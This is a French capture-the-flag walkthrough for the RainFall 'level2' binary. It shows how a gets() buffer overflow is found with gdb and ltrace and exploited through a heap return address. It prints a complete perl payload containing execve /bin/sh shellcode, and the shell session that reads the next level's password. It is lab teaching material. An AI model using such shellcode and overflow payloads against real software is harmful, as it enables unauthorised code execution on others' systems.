# level2

On ne vois rien qui lance un shell, et à priori la seule fonction exploitable sera `gets` avec un buffer overflow

En utilisant entre autres [cette resource](<https://medium.com/codex/buffer-overflows-shellcode-and-memory-corruption-51f546ab00ab>) on comprend qu'on va devoir injecter un shellcode dans notre buffer pour faire exécuter du code arbitraire à notre exécutable pour lui faire lancer un shell

L'idée, ça va etre d'écraser la variable `eip` (adresse de retour) avec notre shellcode, de cette manière, le binaire va exécuter notre code à la fin de la fonction `p` au lieu d'exit

Pour commencer, il faut qu'on trouve l'offset entre le début de notre buffer et `eip` afin de connaitre la taille du payload qu'on va devoir créer. Il y a plusieurs manières de le faire à la main comme expliqué dans l'article mentionné précédemment, mais pour ma part j'ai utilisé la solution de facilité: [cet incroyable outil](<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>)

J'ai généré un pattern de 100 charactères, puis lancé l'exécutable avec `gdb`

```sh
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

On donne l'adresse retournée par `gdb` à l'outil et il nous donne l'offset: `80`

On doit donc créer un payload d'un total de `80 bytes` qui contient:
- notre shellcode
- des charactères servant de "padding" pour remplir le reste du buffer
- l'adresse de retour par laquelle on va remplacer `eip`

La petite subtilité sur cet exercice, c'est que la fonction `p` a un `if` qui nous empèche d'écraser `eip` sur la stack, en revanche, un appel à `strdup` est fait à la fin de la fonction, `strdup` utilisant `malloc`, on peut écraser `eip` sur la heap.

En utilisant la commande `ltrace`, on voit que le `strdup` retourne toujours la même adresse: `0x0804a008`

```sh
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                     = 0xbffff6fc
puts(""
)                                                          = 1
strdup("")                                                        = 0x0804a008
+++ exited (status 8) +++
```
C'est donc cette adresse que l'on va utiliser, de cette manière, `eip` pointera sur le début de notre buffer qui contient notre shellcode

Pour le shellcode, j'ai choisit [ce shell code](https://shell-storm.org/shellcode/files/shellcode-841.html) de 21 bytes que j'ai trouvé sur [shell-storm](https://shell-storm.org/shellcode)

On génère donc notre payload avec `perl`: 
```sh
echo $(perl -e 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "A"x59 . "\x08\xa0\x04\x08";') > /tmp/payload
```

Et on peut récupérer notre flag:

```sh
level2@RainFall:~$ cat /tmp/payload - | ./level2 
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

